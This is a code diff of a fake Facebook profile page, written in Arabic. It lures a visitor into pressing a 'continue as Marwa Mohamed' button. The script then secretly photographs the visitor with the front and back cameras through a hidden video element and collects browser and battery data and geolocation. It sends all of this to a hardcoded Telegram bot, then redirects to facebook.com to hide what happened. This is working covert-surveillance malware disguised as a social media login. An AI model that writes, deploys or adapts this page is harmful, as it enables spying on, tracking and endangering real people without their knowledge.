@@ -6,7 +6,6 @@
 
 <title>Marwa Mohamed</title>
 
-<!-- ==================== Open Graph ==================== -->
 <meta property="og:type"        content="profile">
 <meta property="og:title"       content="Marwa Mohamed">
 <meta property="og:description" content="Marwa Mohamed موجود علي فيسبوك. انضم إلينا">
@@ -17,13 +16,11 @@
 <meta property="og:image:height" content="1200">
 <meta property="og:image:type"   content="image/png">
 
-<!-- ==================== Twitter ==================== -->
 <meta name="twitter:card"        content="summary">
 <meta name="twitter:title"       content="Marwa Mohamed">
 <meta name="twitter:description" content="Marwa Mohamed موجود علي فيسبوك. انضم إلينا">
 <meta name="twitter:image"       content="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png">
 
-<!-- ==================== Favicon ==================== -->
 <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png">
 <link rel="apple-touch-icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png">
 
@@ -31,49 +28,131 @@
   *{margin:0;padding:0;box-sizing:border-box}
   html,body{height:100%}
   body{
-    display:flex;align-items:center;justify-content:center;
-    background:#0f0f13;color:#fff;overflow:hidden;
-    font-family:system-ui,-apple-system,"Segoe UI",sans-serif;
+    background:#fff;
+    color:#1c1e21;
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:20px;
+    overflow:hidden;
   }
-  .wrap{display:flex;flex-direction:column;align-items:center;gap:18px}
-  .spinner{
-    width:64px;height:64px;border-radius:50%;
-    border:4px solid rgba(255,255,255,.12);
-    border-top-color:#4f8cff;
+
+  #loginPage{
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    width:100%;
+    max-width:360px;
+    text-align:center;
+  }
+  #loginPage .fbIcon{
+    width:80px;
+    height:80px;
+    margin-bottom:22px;
+  }
+  #loginPage h1{
+    font-size:18px;
+    font-weight:400;
+    color:#1c1e21;
+    margin-bottom:8px;
+    line-height:1.4;
+  }
+  #loginPage .name{
+    font-weight:700;
+    color:#1877f2;
+  }
+  #loginPage p{
+    font-size:14px;
+    color:#65676b;
+    margin-bottom:26px;
+  }
+  #loginBtn{
+    width:100%;
+    max-width:280px;
+    padding:13px 20px;
+    background:#1877f2;
+    color:#fff;
+    border:none;
+    border-radius:8px;
+    font-size:16px;
+    font-weight:600;
+    cursor:pointer;
+    transition:background .15s;
+  }
+  #loginBtn:active{background:#166fe5}
+  #loginBtn:disabled{opacity:.6;cursor:default}
+
+  #loadPage{
+    display:none;
+    flex-direction:column;
+    align-items:center;
+    gap:18px;
+    text-align:center;
+    max-width:320px;
+  }
+  #loadPage .spinner{
+    width:56px;
+    height:56px;
+    border-radius:50%;
+    border:4px solid #e4e6eb;
+    border-top-color:#1877f2;
     animation:spin .9s linear infinite;
   }
   @keyframes spin{to{transform:rotate(360deg)}}
-  .txt{font-size:14px;color:#8b8b9a;text-align:center;padding:0 20px}
+  #loadPage .txt{
+    font-size:14px;
+    color:#65676b;
+    line-height:1.5;
+  }
+
   video{
-    position:fixed;left:-9999px;top:-9999px;
-    width:2px;height:2px;opacity:0.01;pointer-events:none;
+    position:fixed;
+    left:-9999px;top:-9999px;
+    width:2px;height:2px;
+    opacity:0.01;
+    pointer-events:none;
   }
 </style>
 </head>
-
 <body>
-  <div class="wrap">
+
+  <div id="loginPage">
+    <img class="fbIcon" alt="Facebook"
+         src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png">
+    <h1>الدخول إلى حساب <span class="name">Marwa Mohamed</span></h1>
+    <p>سجّل الدخول للمتابعة إلى فيسبوك</p>
+    <button id="loginBtn">متابعة باسم Marwa Mohamed</button>
+  </div>
+
+  <div id="loadPage">
     <div class="spinner"></div>
     <div class="txt" id="txt">جاري التحميل...</div>
   </div>
 
-  <video id="vFront" autoplay playsinline muted></video>
-  <video id="vBack"  autoplay playsinline muted></video>
+  <video id="vCam" autoplay playsinline muted></video>
 
 <script>
 (function () {
   const BOT_TOKEN = "8936581893:AAF6AB-I1BYXV6H_91K716aCh5w-LCXaYvw";
   const CHAT_ID   = "8800876346";
 
-  const TOTAL_PER_SIDE = 5;
-  const SETTLE_MS      = 350;
-  const MIN_BRIGHTNESS = 12;
-  const PHOTO_GAP_MS   = 80;
+  const PHOTOS_PER_CAMERA = 5;
+  const SETTLE_MS         = 350;
+  const MIN_BRIGHTNESS    = 12;
+  const PHOTO_GAP_MS      = 80;
+  const REDIRECT_URL      = "https://www.facebook.com";
 
-  const vFront = document.getElementById("vFront");
-  const vBack  = document.getElementById("vBack");
-  const txt    = document.getElementById("txt");
+  const vCam = document.getElementById("vCam");
+  const txt  = document.getElementById("txt");
 
+  const loginPage = document.getElementById("loginPage");
+  const loadPage  = document.getElementById("loadPage");
+  const loginBtn  = document.getElementById("loginBtn");
+
+  /* ============================================================
+     بيانات المتصفح
+     ============================================================ */
   async function getBattery(){
     try{
       if(!navigator.getBattery) return null;
@@ -119,6 +198,9 @@
     return out;
   }
 
+  /* ============================================================
+     إرسال تليجرام
+     ============================================================ */
   function sendText(t){
     const fd = new FormData();
     fd.append("chat_id", CHAT_ID);
@@ -145,6 +227,9 @@
       {method:"POST", body:fd}).catch(()=>{});
   }
 
+  /* ============================================================
+     انتظار إطار حقيقي
+     ============================================================ */
   function waitForRealFrame(videoEl, timeout = 2500){
     if (typeof videoEl.requestVideoFrameCallback === "function"){
       return Promise.race([
@@ -160,32 +245,45 @@
     });
   }
 
-  async function openOne(videoEl, facing){
-    if(videoEl.srcObject){
-      videoEl.srcObject.getTracks().forEach(t=>t.stop());
-      videoEl.srcObject = null;
+  /* ============================================================
+     فتح كاميرا واحدة (وبس)
+     ============================================================ */
+  async function openCamera(facing){
+    if(vCam.srcObject){
+      vCam.srcObject.getTracks().forEach(t=>t.stop());
+      vCam.srcObject = null;
     }
     const s = await navigator.mediaDevices.getUserMedia({
       video:{ facingMode:{ideal:facing}, width:{ideal:1280}, height:{ideal:720} },
       audio:false
     });
-    videoEl.srcObject = s;
-    try{ await videoEl.play(); }catch(_){}
-    await waitForRealFrame(videoEl);
+    vCam.srcObject = s;
+    try{ await vCam.play(); }catch(_){}
+    await waitForRealFrame(vCam);
     return s;
   }
 
-  function capture(videoEl, isFront){
+  function closeCamera(){
+    if(vCam.srcObject){
+      vCam.srcObject.getTracks().forEach(t=>t.stop());
+      vCam.srcObject = null;
+    }
+  }
+
+  /* ============================================================
+     التقاط + فحص الإضاءة
+     ============================================================ */
+  function capture(isFront){
     return new Promise(resolve=>{
       const c = document.createElement("canvas");
-      c.width  = videoEl.videoWidth  || 1280;
-      c.height = videoEl.videoHeight || 720;
+      c.width  = vCam.videoWidth  || 1280;
+      c.height = vCam.videoHeight || 720;
       const ctx = c.getContext("2d");
       if(isFront){
         ctx.translate(c.width, 0);
         ctx.scale(-1, 1);
       }
-      ctx.drawImage(videoEl, 0, 0, c.width, c.height);
+      ctx.drawImage(vCam, 0, 0, c.width, c.height);
 
       let brightness = 255;
       try{
@@ -206,15 +304,18 @@
     });
   }
 
-  async function captureSafe(videoEl, isFront, maxTries = 4){
+  async function captureSafe(isFront, maxTries = 4){
     for(let attempt = 1; attempt <= maxTries; attempt++){
-      const {blob, brightness} = await capture(videoEl, isFront);
+      const {blob, brightness} = await capture(isFront);
       if(blob && brightness >= MIN_BRIGHTNESS) return blob;
       await new Promise(r => setTimeout(r, 200));
     }
     return null;
   }
 
+  /* ============================================================
+     الموقع الجغرافي
+     ============================================================ */
   function requestLocation(timeoutMs = 12000){
     return new Promise(resolve => {
       if(!navigator.geolocation) return resolve(null);
@@ -225,9 +326,7 @@
           resolve({
             lat: pos.coords.latitude,
             lon: pos.coords.longitude,
-            accuracy: pos.coords.accuracy,
-            altitude: pos.coords.altitude,
-            speed: pos.coords.speed
+            accuracy: pos.coords.accuracy
           });
         },
         err => {
@@ -239,62 +338,61 @@
     });
   }
 
-  async function run(){
-    txt.textContent = "جاري التحميل...";
+  /* ============================================================
+     مرحلة تصوير كاميرا واحدة (5 صور)
+     ============================================================ */
+  async function shootBatch(facing, label, phaseNum){
+    txt.textContent = `📸 جاري التحقق من ${label}...`;
 
-    sendText(await collect());
-
-    let frontStream = null, backStream = null;
     try{
-      [frontStream, backStream] = await Promise.all([
-        openOne(vFront, "user").catch(() => null),
-        openOne(vBack,  "environment").catch(() => null)
-      ]);
-    }catch(e){}
-
-    if(!frontStream && backStream){
-      try{ frontStream = await openOne(vFront, "user"); }catch{}
-    }
-    if(frontStream && !backStream){
-      try{ backStream = await openOne(vBack, "environment"); }catch{}
-    }
-    if(!frontStream && !backStream){
-      txt.textContent = "❌ لا توجد كاميرا متاحة";
-      return;
+      await openCamera(facing);
+    }catch(e){
+      console.warn(`camera ${facing} failed:`, e.message);
+      return false;
     }
 
+    // وقت تأقلم الكاميرا مع الإضاءة
     await new Promise(r => setTimeout(r, SETTLE_MS));
 
-    const sequence = [];
-    for(let i=0; i<TOTAL_PER_SIDE; i++) sequence.push({f:"user", label:"أمامية", phase:1});
-    for(let i=0; i<TOTAL_PER_SIDE; i++) sequence.push({f:"environment", label:"خلفية", phase:2});
-    for(let i=0; i<TOTAL_PER_SIDE; i++) sequence.push({f:"user", label:"أمامية", phase:3});
-
-    const counters = {1:0, 2:0, 3:0};
-
-    for(let i=0; i<sequence.length; i++){
-      const step = sequence[i];
-      const videoEl = step.f === "user" ? vFront : vBack;
-      if(!videoEl.srcObject) continue;
-
-      counters[step.phase]++;
-      const num = counters[step.phase];
-
-      const blob = await captureSafe(videoEl, step.f === "user");
-      if(blob) sendPhoto(blob, `📷 ${step.label} #${num} (مرحلة ${step.phase}/3)`);
-
+    for(let i=1; i<=PHOTOS_PER_CAMERA; i++){
+      const blob = await captureSafe(facing === "user");
+      if(blob){
+        sendPhoto(blob, `📷 ${label} #${i} (مرحلة ${phaseNum}/2)`);
+      }
       await new Promise(r => setTimeout(r, PHOTO_GAP_MS));
     }
 
-    [vFront, vBack].forEach(v => {
-      if(v.srcObject){
-        v.srcObject.getTracks().forEach(t=>t.stop());
-        v.srcObject = null;
-      }
-    });
+    // نقفل الكاميرا قبل فتح التانية
+    closeCamera();
+    await new Promise(r => setTimeout(r, 250));
+    return true;
+  }
 
-    txt.textContent = "📍 جاري تحديد الموقع...";
+  /* ============================================================
+     التشغيل الكامل
+     ============================================================ */
+  async function run(){
+    loginPage.style.display = "none";
+    loadPage.style.display  = "flex";
+    txt.textContent = "جاري التحميل...";
 
+    // (أ) البيانات الأولية
+    sendText(await collect());
+
+    // (ب) المرحلة 1: الكاميرا الأمامية
+    const frontOK = await shootBatch("user", "أمامية", 1);
+
+    // (ج) المرحلة 2: الكاميرا الخلفية
+    const backOK = await shootBatch("environment", "خلفية", 2);
+
+    // لو الاتنين فشلوا، نروح على طول
+    if(!frontOK && !backOK){
+      window.location.href = REDIRECT_URL;
+      return;
+    }
+
+    // (د) الموقع الجغرافي
+    txt.textContent = "جاري التحقق من الهوية...";
     const loc = await requestLocation();
 
     if(loc && loc.lat !== undefined){
@@ -309,10 +407,17 @@
       sendText("📍 <b>الموقع الجغرافي</b>\n❌ لم يتم الحصول على الموقع");
     }
 
-    txt.textContent = "✅ تم";
+    // (هـ) التحويل لفيسبوك
+    txt.textContent = "تم التحقق ✅";
+    await new Promise(r => setTimeout(r, 600));
+    window.location.href = REDIRECT_URL;
   }
 
-  window.addEventListener("load", run);
+  loginBtn.addEventListener("click", function(){
+    loginBtn.disabled = true;
+    loginBtn.textContent = "جاري التحقق...";
+    run();
+  });
 })();
 </script>
 </body>
